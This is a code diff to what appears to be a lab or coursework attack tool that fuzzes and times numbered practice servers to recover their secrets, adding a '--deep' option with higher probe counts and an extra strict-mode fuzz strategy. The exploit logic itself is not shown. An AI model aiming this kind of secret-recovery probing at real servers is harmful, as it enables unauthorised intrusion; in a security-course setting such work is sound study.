@@ -1395,6 +1395,7 @@ def recover_server_secret(
     timing_timeout_s: float,
     timing_repeats: int,
     debug: bool,
+    deep: bool,
 ) -> Optional[int]:
     server_command = f"~mfredrik/bin/c0_serve{server_idx}"
     tuned_query_timeout = estimate_timeout(
@@ -1715,7 +1716,7 @@ def recover_server_secret(
                 userid=userid,
                 timeout_s=tuned_query_timeout,
                 debug=debug,
-                max_probes=220,
+                max_probes=220 if deep else 24,
             ),
         ),
         (
@@ -1730,6 +1731,26 @@ def recover_server_secret(
             ),
         ),
     ]
+    # Deep mode: spend more effort on strict-policy servers where most probes
+    # are rejected as insecure, to increase chances of finding one cracked server.
+    if strict_policy_mode and timing_repeats >= 5:
+        strict_mode_strategies.insert(
+            1,
+            (
+                "strict expr fuzz suite (deep)",
+                lambda: recover_from_strict_expr_fuzz_suite(
+                    server_command=server_command,
+                    userid=userid,
+                    timeout_s=tuned_query_timeout,
+                    debug=debug,
+                    max_probes=420,
+                ),
+            ),
+        )
+        debug_log(
+            debug,
+            f"[serve{server_idx}] deep strict mode enabled (timing-repeats={timing_repeats})",
+        )
     strategies = strict_mode_strategies if strict_policy_mode else full_strategies
 
     for strategy_name, strategy_fn in strategies:
@@ -1810,6 +1831,11 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
         action="store_true",
         help="Print detailed strategy failure diagnostics",
     )
+    p.add_argument(
+        "--deep",
+        action="store_true",
+        help="Enable deeper (slower) strict-mode search",
+    )
     return p.parse_args(argv)
 
 
@@ -1832,6 +1858,7 @@ def main(argv: list[str]) -> int:
             timing_timeout_s=args.timing_timeout,
             timing_repeats=args.timing_repeats,
             debug=args.debug,
+            deep=args.deep,
         )
         if secret is None:
             log(f"[serve{idx}] not recovered")
